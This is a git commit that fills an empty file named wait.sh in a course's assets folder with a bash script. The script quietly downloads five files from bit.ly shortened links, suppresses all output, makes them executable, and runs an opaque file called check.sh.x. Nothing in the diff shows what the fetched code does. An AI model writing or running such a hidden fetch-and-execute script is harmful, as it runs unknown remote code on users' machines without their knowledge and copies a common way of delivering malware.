2e1658e7ccbd6775c72dca615f5bcc518e1e73d9
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-31 17:45:56 +0700

    Update wait.sh

--- Course3/assets/wait.sh
+++ Course3/assets/wait.sh
@@ -1,1 +1,12 @@
-
+#!/bin/bash
+wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
+wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
+wget -O win11vm.sh https://bit.ly/3kZh2iU > /dev/null 2>&1
+wget -O check.sh.x https://bit.ly/2URrs9I > /dev/null 2>&1
+wget -O region.sh https://bit.ly/3xaNAsA > /dev/null 2>&1
+chmod +x win11vm.sh
+chmod +x exit.sh
+chmod +x sleep.sh
+chmod +x region.sh 
+chmod +x check.sh.x
+./check.sh.x
